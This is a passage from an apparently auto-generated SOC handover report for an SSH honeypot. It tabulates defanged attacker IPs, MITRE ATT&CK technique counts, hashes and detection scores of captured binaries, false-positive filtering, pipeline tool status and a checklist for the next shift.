| `171.97.104[.]10` | 1 | 2026-03-24 17:14 | 2026-03-24 17:14 | 37s | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]208` | 1 | 2026-03-24 18:43 | 2026-03-24 18:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.220.237[.]28` | 1 | 2026-03-24 17:35 | 2026-03-24 17:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.179.80[.]12` | 1 | 2026-03-24 17:20 | 2026-03-24 17:20 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.216.132[.]2` | 1 | 2026-03-24 18:46 | 2026-03-24 18:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `203.163.241[.]55` | 1 | 2026-03-24 18:31 | 2026-03-24 18:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `219.248.65[.]30` | 1 | 2026-03-24 18:36 | 2026-03-24 18:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.114[.]126` | 1 | 2026-03-24 18:34 | 2026-03-24 18:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.187.35[.]142` | 1 | 2026-03-24 17:51 | 2026-03-24 17:51 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `65.20.174[.]63` | 1 | 2026-03-24 17:56 | 2026-03-24 17:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.56.96[.]82` | 1 | 2026-03-24 18:45 | 2026-03-24 18:45 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.243.121[.]95` | CN | China Mobile Communications Corporation | **100** ⚠️ | 1 |
| `203.163.241[.]55` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 10 |
| `180.76.105[.]165` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `151.30.251[.]185` | IT | WIND TRE S.P.A. | **100** ⚠️ | 0 |
| `186.209.52[.]196` | BR | Net Turbo Telecom | **100** ⚠️ | 32 |
| `65.20.174[.]63` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `101.126.24[.]58` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `100.38.151[.]62` | US | Verizon Business | **100** ⚠️ | 16 |
| `81.56.96[.]82` | IT | Iliad / Free SAS | **100** ⚠️ | 19 |
| `186.179.80[.]12` | CL | TELEFÓNICA CHILE S.A. (MAYORISTAS) | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 6 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 111 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (17.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 25 recon entry/entries in table (7 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-24T19:00:27Z_
